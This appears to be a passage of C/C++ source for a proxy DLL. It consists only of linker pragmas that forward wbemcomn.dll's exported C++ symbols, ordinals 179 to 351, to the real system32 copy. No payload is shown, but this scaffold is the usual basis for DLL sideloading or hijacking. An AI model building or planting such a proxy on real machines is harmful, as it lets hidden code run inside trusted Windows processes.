#pragma comment (linker, "/export:??1CBuffer@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CBuffer@@QEAA@XZ,@179")
#pragma comment (linker, "/export:??1CCheckedInCritSec@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CCheckedInCritSec@@QEAA@XZ,@180")
#pragma comment (linker, "/export:??1CClientOpsNode@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CClientOpsNode@@QEAA@XZ,@181")
#pragma comment (linker, "/export:??1CCritSec@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CCritSec@@QEAA@XZ,@182")
#pragma comment (linker, "/export:??1CDMTFParser@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CDMTFParser@@QEAA@XZ,@183")
#pragma comment (linker, "/export:??1CDatePart@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CDatePart@@QEAA@XZ,@184")
#pragma comment (linker, "/export:??1CDateTimeParser@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CDateTimeParser@@QEAA@XZ,@185")
#pragma comment (linker, "/export:??1CEnterWbemCriticalSection@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CEnterWbemCriticalSection@@QEAA@XZ,@186")
#pragma comment (linker, "/export:??1CEventLog@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CEventLog@@QEAA@XZ,@187")
#pragma comment (linker, "/export:??1CEventLogRecord@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CEventLogRecord@@QEAA@XZ,@188")
#pragma comment (linker, "/export:??1CExecQueue@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CExecQueue@@QEAA@XZ,@189")
#pragma comment (linker, "/export:??1CExecRequest@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CExecRequest@@UEAA@XZ,@190")
#pragma comment (linker, "/export:??1CFlexArray@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CFlexArray@@QEAA@XZ,@191")
#pragma comment (linker, "/export:??1CFlexQueue@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CFlexQueue@@QEAA@XZ,@192")
#pragma comment (linker, "/export:??1CHaltable@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CHaltable@@UEAA@XZ,@193")
#pragma comment (linker, "/export:??1CIdentitySecurity@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CIdentitySecurity@@QEAA@XZ,@194")
#pragma comment (linker, "/export:??1CIdentityTest@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CIdentityTest@@QEAA@XZ,@195")
#pragma comment (linker, "/export:??1CInCritSec@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CInCritSec@@QEAA@XZ,@196")
#pragma comment (linker, "/export:??1CInsertionString@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CInsertionString@@QEAA@XZ,@197")
#pragma comment (linker, "/export:??1CInstructionQueue@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CInstructionQueue@@QEAA@XZ,@198")
#pragma comment (linker, "/export:??1CLike@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CLike@@QEAA@XZ,@199")
#pragma comment (linker, "/export:??1CLimitControl@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CLimitControl@@UEAA@XZ,@200")
#pragma comment (linker, "/export:??1CMRCICompression@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CMRCICompression@@QEAA@XZ,@201")
#pragma comment (linker, "/export:??1CMUILocaleList@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CMUILocaleList@@QEAA@XZ,@202")
#pragma comment (linker, "/export:??1CMinMaxLimitControl@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CMinMaxLimitControl@@UEAA@XZ,@203")
#pragma comment (linker, "/export:??1CNtAce@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CNtAce@@UEAA@XZ,@204")
#pragma comment (linker, "/export:??1CNtAcl@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CNtAcl@@QEAA@XZ,@205")
#pragma comment (linker, "/export:??1CNtSecurityDescriptor@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CNtSecurityDescriptor@@QEAA@XZ,@206")
#pragma comment (linker, "/export:??1CNtSid@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CNtSid@@QEAA@XZ,@207")
#pragma comment (linker, "/export:??1CPropertyName@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CPropertyName@@QEAA@XZ,@208")
#pragma comment (linker, "/export:??1CPublishWMIOperationEvent@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CPublishWMIOperationEvent@@QEAA@XZ,@209")
#pragma comment (linker, "/export:??1CRegistryMinMaxLimitControl@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CRegistryMinMaxLimitControl@@UEAA@XZ,@210")
#pragma comment (linker, "/export:??1CSafeArray@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CSafeArray@@QEAA@XZ,@211")
#pragma comment (linker, "/export:??1CStaticCritSec@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CStaticCritSec@@QEAA@XZ,@212")
#pragma comment (linker, "/export:??1CTextTemplate@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CTextTemplate@@QEAA@XZ,@213")
#pragma comment (linker, "/export:??1CTimerGenerator@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CTimerGenerator@@UEAA@XZ,@214")
#pragma comment (linker, "/export:??1CTimerInstruction@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CTimerInstruction@@UEAA@XZ,@215")
#pragma comment (linker, "/export:??1CUnk@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CUnk@@UEAA@XZ,@216")
#pragma comment (linker, "/export:??1CUnkInternal@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CUnkInternal@@UEAA@XZ,@217")
#pragma comment (linker, "/export:??1CVar@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CVar@@QEAA@XZ,@218")
#pragma comment (linker, "/export:??1CVarVector@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CVarVector@@QEAA@XZ,@219")
#pragma comment (linker, "/export:??1CWQLScanner@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CWQLScanner@@QEAA@XZ,@220")
#pragma comment (linker, "/export:??1CWStringArray@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CWStringArray@@QEAA@XZ,@221")
#pragma comment (linker, "/export:??1CWbemCallSecurity@@AEAA@XZ=c:/windows/system32/wbemcomn.??1CWbemCallSecurity@@AEAA@XZ,@222")
#pragma comment (linker, "/export:??1CWbemCriticalSection@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CWbemCriticalSection@@QEAA@XZ,@223")
#pragma comment (linker, "/export:??1CWbemInstallObject@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CWbemInstallObject@@QEAA@XZ,@224")
#pragma comment (linker, "/export:??1CWin32DefaultArena@@QEAA@XZ=c:/windows/system32/wbemcomn.??1CWin32DefaultArena@@QEAA@XZ,@225")
#pragma comment (linker, "/export:??1QL1_Parser@@UEAA@XZ=c:/windows/system32/wbemcomn.??1QL1_Parser@@UEAA@XZ,@226")
#pragma comment (linker, "/export:??1QL_LEVEL_1_RPN_EXPRESSION@@QEAA@XZ=c:/windows/system32/wbemcomn.??1QL_LEVEL_1_RPN_EXPRESSION@@QEAA@XZ,@227")
#pragma comment (linker, "/export:??1QL_LEVEL_1_TOKEN@@QEAA@XZ=c:/windows/system32/wbemcomn.??1QL_LEVEL_1_TOKEN@@QEAA@XZ,@228")
#pragma comment (linker, "/export:??1Registry@@QEAA@XZ=c:/windows/system32/wbemcomn.??1Registry@@QEAA@XZ,@229")
#pragma comment (linker, "/export:??1WString2@@QEAA@XZ=c:/windows/system32/wbemcomn.??1WString2@@QEAA@XZ,@230")
#pragma comment (linker, "/export:??1WString@@QEAA@XZ=c:/windows/system32/wbemcomn.??1WString@@QEAA@XZ,@231")
#pragma comment (linker, "/export:??4?$CLockableFlexArray@VCStaticCritSec@@@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4?$CLockableFlexArray@VCStaticCritSec@@@@QEAAAEAV0@AEAV0@@Z,@232")
#pragma comment (linker, "/export:??4?$SZLess@PEBG@@QEAAAEAU0@AEBU0@@Z=c:/windows/system32/wbemcomn.??4?$SZLess@PEBG@@QEAAAEAU0@AEBU0@@Z,@233")
#pragma comment (linker, "/export:??4C9XAce@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4C9XAce@@QEAAAEAV0@AEBV0@@Z,@234")
#pragma comment (linker, "/export:??4CAbstractQl1Parser@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CAbstractQl1Parser@@QEAAAEAV0@AEBV0@@Z,@235")
#pragma comment (linker, "/export:??4CArena@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CArena@@QEAAAEAV0@AEBV0@@Z,@236")
#pragma comment (linker, "/export:??4CBaseAce@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CBaseAce@@QEAAAEAV0@AEBV0@@Z,@237")
#pragma comment (linker, "/export:??4CBaseMrciCompression@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CBaseMrciCompression@@QEAAAEAV0@AEBV0@@Z,@238")
#pragma comment (linker, "/export:??4CBasicUnloadInstruction@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CBasicUnloadInstruction@@QEAAAEAV0@AEBV0@@Z,@239")
#pragma comment (linker, "/export:??4CBuffer@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CBuffer@@QEAAAEAV0@AEBV0@@Z,@240")
#pragma comment (linker, "/export:??4CCheckedInCritSec@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CCheckedInCritSec@@QEAAAEAV0@AEBV0@@Z,@241")
#pragma comment (linker, "/export:??4CCircularQueue@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CCircularQueue@@QEAAAEAV0@AEBV0@@Z,@242")
#pragma comment (linker, "/export:??4CClientOpsNode@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CClientOpsNode@@QEAAAEAV0@AEBV0@@Z,@243")
#pragma comment (linker, "/export:??4CContainerControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CContainerControl@@QEAAAEAV0@AEBV0@@Z,@244")
#pragma comment (linker, "/export:??4CCritSec@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CCritSec@@QEAAAEAV0@AEBV0@@Z,@245")
#pragma comment (linker, "/export:??4CDMTFParser@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CDMTFParser@@QEAAAEAV0@AEBV0@@Z,@246")
#pragma comment (linker, "/export:??4CDatePart@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CDatePart@@QEAAAEAV0@AEBV0@@Z,@247")
#pragma comment (linker, "/export:??4CDateTimeParser@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CDateTimeParser@@QEAAAEAV0@AEBV0@@Z,@248")
#pragma comment (linker, "/export:??4CEnterWbemCriticalSection@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CEnterWbemCriticalSection@@QEAAAEAV0@AEBV0@@Z,@249")
#pragma comment (linker, "/export:??4CExecQueue@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CExecQueue@@QEAAAEAV0@AEAV0@@Z,@250")
#pragma comment (linker, "/export:??4CExecRequest@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CExecRequest@@QEAAAEAV0@AEBV0@@Z,@251")
#pragma comment (linker, "/export:??4CFlexArray@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CFlexArray@@QEAAAEAV0@AEAV0@@Z,@252")
#pragma comment (linker, "/export:??4CFlexQueue@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CFlexQueue@@QEAAAEAV0@AEBV0@@Z,@253")
#pragma comment (linker, "/export:??4CHaltable@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CHaltable@@QEAAAEAV0@AEBV0@@Z,@254")
#pragma comment (linker, "/export:??4CHex@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CHex@@QEAAAEAV0@AEBV0@@Z,@255")
#pragma comment (linker, "/export:??4CIdentitySecurity@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CIdentitySecurity@@QEAAAEAV0@AEBV0@@Z,@256")
#pragma comment (linker, "/export:??4CIdentityTest@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CIdentityTest@@QEAAAEAV0@AEBV0@@Z,@257")
#pragma comment (linker, "/export:??4CInCritSec@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CInCritSec@@QEAAAEAV0@AEBV0@@Z,@258")
#pragma comment (linker, "/export:??4CInsertionString@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CInsertionString@@QEAAAEAV0@AEBV0@@Z,@259")
#pragma comment (linker, "/export:??4CInstructionQueue@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CInstructionQueue@@QEAAAEAV0@AEBV0@@Z,@260")
#pragma comment (linker, "/export:??4CInstructionTest@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CInstructionTest@@QEAAAEAV0@AEBV0@@Z,@261")
#pragma comment (linker, "/export:??4CLifeControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CLifeControl@@QEAAAEAV0@AEBV0@@Z,@262")
#pragma comment (linker, "/export:??4CLike@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CLike@@QEAAAEAV0@AEBV0@@Z,@263")
#pragma comment (linker, "/export:??4CLimitControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CLimitControl@@QEAAAEAV0@AEBV0@@Z,@264")
#pragma comment (linker, "/export:??4CMRCICompression@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CMRCICompression@@QEAAAEAV0@AEBV0@@Z,@265")
#pragma comment (linker, "/export:??4CMRCIControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CMRCIControl@@QEAAAEAV0@AEBV0@@Z,@266")
#pragma comment (linker, "/export:??4CMUILocale@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CMUILocale@@QEAAAEAV0@AEBV0@@Z,@267")
#pragma comment (linker, "/export:??4CMUILocaleList@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CMUILocaleList@@QEAAAEAV0@AEBV0@@Z,@268")
#pragma comment (linker, "/export:??4CMemoryLog@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CMemoryLog@@QEAAAEAV0@AEBV0@@Z,@269")
#pragma comment (linker, "/export:??4CMinMaxLimitControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CMinMaxLimitControl@@QEAAAEAV0@AEBV0@@Z,@270")
#pragma comment (linker, "/export:??4CNtAce@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CNtAce@@QEAAAEAV0@AEBV0@@Z,@271")
#pragma comment (linker, "/export:??4CNtAcl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CNtAcl@@QEAAAEAV0@AEBV0@@Z,@272")
#pragma comment (linker, "/export:??4CNtSecurity@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CNtSecurity@@QEAAAEAV0@AEBV0@@Z,@273")
#pragma comment (linker, "/export:??4CNtSecurityDescriptor@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CNtSecurityDescriptor@@QEAAAEAV0@AEAV0@@Z,@274")
#pragma comment (linker, "/export:??4CNtSid@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CNtSid@@QEAAAEAV0@AEBV0@@Z,@275")
#pragma comment (linker, "/export:??4CPersistentConfig@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CPersistentConfig@@QEAAAEAV0@AEBV0@@Z,@276")
#pragma comment (linker, "/export:??4CPropertyName@@QEAAXAEBU_tag_WbemPropertyName@@@Z=c:/windows/system32/wbemcomn.??4CPropertyName@@QEAAXAEBU_tag_WbemPropertyName@@@Z,@277")
#pragma comment (linker, "/export:??4CPropertyName@@QEAAXAEBV0@@Z=c:/windows/system32/wbemcomn.??4CPropertyName@@QEAAXAEBV0@@Z,@278")
#pragma comment (linker, "/export:??4CPublishWMIOperationEvent@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CPublishWMIOperationEvent@@QEAAAEAV0@AEBV0@@Z,@279")
#pragma comment (linker, "/export:??4CQl1ParseSink@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CQl1ParseSink@@QEAAAEAV0@AEBV0@@Z,@280")
#pragma comment (linker, "/export:??4CRegistryMinMaxLimitControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CRegistryMinMaxLimitControl@@QEAAAEAV0@AEBV0@@Z,@281")
#pragma comment (linker, "/export:??4CSafeArray@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CSafeArray@@QEAAAEAV0@AEAV0@@Z,@282")
#pragma comment (linker, "/export:??4CSmallArrayBlob@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CSmallArrayBlob@@QEAAAEAV0@AEBV0@@Z,@283")
#pragma comment (linker, "/export:??4CStaticCritSec@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CStaticCritSec@@QEAAAEAV0@AEBV0@@Z,@284")
#pragma comment (linker, "/export:??4CTextTemplate@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CTextTemplate@@QEAAAEAV0@AEBV0@@Z,@285")
#pragma comment (linker, "/export:??4CTimerGenerator@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CTimerGenerator@@QEAAAEAV0@AEBV0@@Z,@286")
#pragma comment (linker, "/export:??4CTimerInstruction@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CTimerInstruction@@QEAAAEAV0@AEBV0@@Z,@287")
#pragma comment (linker, "/export:??4CTraceSessionControl@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CTraceSessionControl@@QEAAAEAV0@AEBV0@@Z,@288")
#pragma comment (linker, "/export:??4CUnk@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CUnk@@QEAAAEAV0@AEBV0@@Z,@289")
#pragma comment (linker, "/export:??4CUnkInternal@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CUnkInternal@@QEAAAEAV0@AEBV0@@Z,@290")
#pragma comment (linker, "/export:??4CVar@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CVar@@QEAAAEAV0@AEBV0@@Z,@291")
#pragma comment (linker, "/export:??4CVarVector@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CVarVector@@QEAAAEAV0@AEAV0@@Z,@292")
#pragma comment (linker, "/export:??4CWMITraceSettings@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWMITraceSettings@@QEAAAEAV0@AEBV0@@Z,@293")
#pragma comment (linker, "/export:??4CWQLScanner@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CWQLScanner@@QEAAAEAV0@AEAV0@@Z,@294")
#pragma comment (linker, "/export:??4CWStringArray@@QEAAAEAV0@AEAV0@@Z=c:/windows/system32/wbemcomn.??4CWStringArray@@QEAAAEAV0@AEAV0@@Z,@295")
#pragma comment (linker, "/export:??4CWbemCallSecurity@@AEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWbemCallSecurity@@AEAAAEAV0@AEBV0@@Z,@296")
#pragma comment (linker, "/export:??4CWbemCriticalSection@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWbemCriticalSection@@QEAAAEAV0@AEBV0@@Z,@297")
#pragma comment (linker, "/export:??4CWbemInstallObject@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWbemInstallObject@@QEAAAEAV0@AEBV0@@Z,@298")
#pragma comment (linker, "/export:??4CWbemInterval@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWbemInterval@@QEAAAEAV0@AEBV0@@Z,@299")
#pragma comment (linker, "/export:??4CWbemTime@@QEAAXAEBV0@@Z=c:/windows/system32/wbemcomn.??4CWbemTime@@QEAAXAEBV0@@Z,@300")
#pragma comment (linker, "/export:??4CWbemTimeSpan@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWbemTimeSpan@@QEAAAEAV0@AEBV0@@Z,@301")
#pragma comment (linker, "/export:??4CWin32DefaultArena@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4CWin32DefaultArena@@QEAAAEAV0@AEBV0@@Z,@302")
#pragma comment (linker, "/export:??4MD5@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4MD5@@QEAAAEAV0@AEBV0@@Z,@303")
#pragma comment (linker, "/export:??4QL1_Parser@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4QL1_Parser@@QEAAAEAV0@AEBV0@@Z,@304")
#pragma comment (linker, "/export:??4QL_LEVEL_1_RPN_EXPRESSION@@QEAAAEAU0@AEBU0@@Z=c:/windows/system32/wbemcomn.??4QL_LEVEL_1_RPN_EXPRESSION@@QEAAAEAU0@AEBU0@@Z,@305")
#pragma comment (linker, "/export:??4QL_LEVEL_1_TOKEN@@QEAAAEAU0@AEBU0@@Z=c:/windows/system32/wbemcomn.??4QL_LEVEL_1_TOKEN@@QEAAAEAU0@AEBU0@@Z,@306")
#pragma comment (linker, "/export:??4QL_LEVEL_1_TOKEN@@QEAAAEAU0@AEBU_tag_WbemQl1Token@@@Z=c:/windows/system32/wbemcomn.??4QL_LEVEL_1_TOKEN@@QEAAAEAU0@AEBU_tag_WbemQl1Token@@@Z,@307")
#pragma comment (linker, "/export:??4Registry@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4Registry@@QEAAAEAV0@AEBV0@@Z,@308")
#pragma comment (linker, "/export:??4SHA256@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4SHA256@@QEAAAEAV0@AEBV0@@Z,@309")
#pragma comment (linker, "/export:??4WString2@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4WString2@@QEAAAEAV0@AEBV0@@Z,@310")
#pragma comment (linker, "/export:??4WString2@@QEAAAEAV0@PEBG@Z=c:/windows/system32/wbemcomn.??4WString2@@QEAAAEAV0@PEBG@Z,@311")
#pragma comment (linker, "/export:??4WString@@QEAAAEAV0@AEBV0@@Z=c:/windows/system32/wbemcomn.??4WString@@QEAAAEAV0@AEBV0@@Z,@312")
#pragma comment (linker, "/export:??4WString@@QEAAAEAV0@PEBG@Z=c:/windows/system32/wbemcomn.??4WString@@QEAAAEAV0@PEBG@Z,@313")
#pragma comment (linker, "/export:??8CEventLogRecord@@QEAAHAEBV0@@Z=c:/windows/system32/wbemcomn.??8CEventLogRecord@@QEAAHAEBV0@@Z,@314")
#pragma comment (linker, "/export:??8CNtSid@@QEAAHAEAV0@@Z=c:/windows/system32/wbemcomn.??8CNtSid@@QEAAHAEAV0@@Z,@315")
#pragma comment (linker, "/export:??8CPropertyName@@QEAAHAEBU_tag_WbemPropertyName@@@Z=c:/windows/system32/wbemcomn.??8CPropertyName@@QEAAHAEBU_tag_WbemPropertyName@@@Z,@316")
#pragma comment (linker, "/export:??8CVar@@QEAAHAEAV0@@Z=c:/windows/system32/wbemcomn.??8CVar@@QEAAHAEAV0@@Z,@317")
#pragma comment (linker, "/export:??8CVarVector@@QEAAHAEAV0@@Z=c:/windows/system32/wbemcomn.??8CVarVector@@QEAAHAEAV0@@Z,@318")
#pragma comment (linker, "/export:??ACFlexArray@@QEAAAEAPEAXH@Z=c:/windows/system32/wbemcomn.??ACFlexArray@@QEAAAEAPEAXH@Z,@319")
#pragma comment (linker, "/export:??ACFlexArray@@QEBAPEAXH@Z=c:/windows/system32/wbemcomn.??ACFlexArray@@QEBAPEAXH@Z,@320")
#pragma comment (linker, "/export:??ACSmallArrayBlob@@QEBAPEAXH@Z=c:/windows/system32/wbemcomn.??ACSmallArrayBlob@@QEBAPEAXH@Z,@321")
#pragma comment (linker, "/export:??ACVarVector@@QEAAAEAVCVar@@H@Z=c:/windows/system32/wbemcomn.??ACVarVector@@QEAAAEAVCVar@@H@Z,@322")
#pragma comment (linker, "/export:??ACWStringArray@@QEBAPEAGH@Z=c:/windows/system32/wbemcomn.??ACWStringArray@@QEBAPEAGH@Z,@323")
#pragma comment (linker, "/export:??AWString2@@QEBAGH@Z=c:/windows/system32/wbemcomn.??AWString2@@QEBAGH@Z,@324")
#pragma comment (linker, "/export:??AWString@@QEBAGH@Z=c:/windows/system32/wbemcomn.??AWString@@QEBAGH@Z,@325")
#pragma comment (linker, "/export:??BCHex@@QEAAJXZ=c:/windows/system32/wbemcomn.??BCHex@@QEAAJXZ,@326")
#pragma comment (linker, "/export:??BCVar@@QEAA?AU_FILETIME@@XZ=c:/windows/system32/wbemcomn.??BCVar@@QEAA?AU_FILETIME@@XZ,@327")
#pragma comment (linker, "/export:??BCVar@@QEAADXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAADXZ,@328")
#pragma comment (linker, "/export:??BCVar@@QEAAEXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAEXZ,@329")
#pragma comment (linker, "/export:??BCVar@@QEAAFXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAFXZ,@330")
#pragma comment (linker, "/export:??BCVar@@QEAAGXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAGXZ,@331")
#pragma comment (linker, "/export:??BCVar@@QEAAJXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAJXZ,@332")
#pragma comment (linker, "/export:??BCVar@@QEAAKXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAKXZ,@333")
#pragma comment (linker, "/export:??BCVar@@QEAAMXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAMXZ,@334")
#pragma comment (linker, "/export:??BCVar@@QEAANXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAANXZ,@335")
#pragma comment (linker, "/export:??BCVar@@QEAAPEADXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAPEADXZ,@336")
#pragma comment (linker, "/export:??BCVar@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAPEAGXZ,@337")
#pragma comment (linker, "/export:??BCVar@@QEAAPEAU_GUID@@XZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAPEAU_GUID@@XZ,@338")
#pragma comment (linker, "/export:??BCVar@@QEAAPEAUtagBLOB@@XZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAPEAUtagBLOB@@XZ,@339")
#pragma comment (linker, "/export:??BCVar@@QEAAPEAVCVarVector@@XZ=c:/windows/system32/wbemcomn.??BCVar@@QEAAPEAVCVarVector@@XZ,@340")
#pragma comment (linker, "/export:??BWString2@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.??BWString2@@QEAAPEAGXZ,@341")
#pragma comment (linker, "/export:??BWString2@@QEBAPEBGXZ=c:/windows/system32/wbemcomn.??BWString2@@QEBAPEBGXZ,@342")
#pragma comment (linker, "/export:??BWString@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.??BWString@@QEAAPEAGXZ,@343")
#pragma comment (linker, "/export:??BWString@@QEBAPEBGXZ=c:/windows/system32/wbemcomn.??BWString@@QEBAPEBGXZ,@344")
#pragma comment (linker, "/export:??DCWbemInterval@@QEBA?AV0@N@Z=c:/windows/system32/wbemcomn.??DCWbemInterval@@QEBA?AV0@N@Z,@345")
#pragma comment (linker, "/export:??GCWbemTime@@QEBA?AV0@AEBVCWbemTimeSpan@@@Z=c:/windows/system32/wbemcomn.??GCWbemTime@@QEBA?AV0@AEBVCWbemTimeSpan@@@Z,@346")
#pragma comment (linker, "/export:??GCWbemTime@@QEBA?AVCWbemInterval@@AEBV0@@Z=c:/windows/system32/wbemcomn.??GCWbemTime@@QEBA?AVCWbemInterval@@AEBV0@@Z,@347")
#pragma comment (linker, "/export:??HCWbemInterval@@QEBA?AV0@V0@@Z=c:/windows/system32/wbemcomn.??HCWbemInterval@@QEBA?AV0@V0@@Z,@348")
#pragma comment (linker, "/export:??HCWbemTime@@QEBA?AV0@AEBVCWbemInterval@@@Z=c:/windows/system32/wbemcomn.??HCWbemTime@@QEBA?AV0@AEBVCWbemInterval@@@Z,@349")
#pragma comment (linker, "/export:??HCWbemTime@@QEBA?AV0@AEBVCWbemTimeSpan@@@Z=c:/windows/system32/wbemcomn.??HCWbemTime@@QEBA?AV0@AEBVCWbemTimeSpan@@@Z,@350")
#pragma comment (linker, "/export:??MCWbemInterval@@QEAAHV0@@Z=c:/windows/system32/wbemcomn.??MCWbemInterval@@QEAAHV0@@Z,@351")
